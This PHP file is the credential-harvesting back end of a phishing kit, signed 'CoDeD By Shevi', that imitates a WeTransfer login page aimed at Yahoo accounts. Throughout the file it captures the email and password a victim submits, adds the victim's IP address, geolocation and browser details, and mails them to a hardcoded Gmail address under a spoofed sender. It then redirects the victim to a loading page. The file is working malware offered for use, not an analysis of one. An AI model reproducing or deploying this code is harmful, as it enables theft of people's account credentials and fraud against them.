<?
require_once('geoplugin.class.php');


$geoplugin = new geoPlugin();

$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    
$ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    
$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    
$ip = $_SERVER['REMOTE_ADDR']; 
} 
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "----WEtransfer Logx CoDeD By Shevi----\n"; 
$message .= "Email: ".$_POST['id1']."\n";
$message .= "Password: ".$_POST['id2']."\n";  
$message .= "Domain: Yahoo\n";  
$message .= "--------IP and Browser--------\n"; 
$message .= "IP Address: ".$ip."\n";

$message .= "City: {$geoplugin->city}\n";

$message .= "Region: {$geoplugin->region}\n";

$message .= "Country Name: {$geoplugin->countryName}\n";

$message .= "Country Code: {$geoplugin->countryCode}\n";

$message .= "Browser: ".$browser."\n";
$message .= "-----------++++++++-----------\n"; 
$recipient = "rene.tank279@gmail.com"; 
$subject = "WEtransfer Logx - Yahoo+++ $ip"; 
$headers = "From: Shevi P <we@we-llc.com>\r\n"; 
$Headers .= "MIME-Version: 1.0\r\n";
$headers .= $_POST['Shevi P <we@we-llc.com>>']."\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
if (mail($recipient,$subject,$message,$headers)) { header("Location: loading.php"); } ?>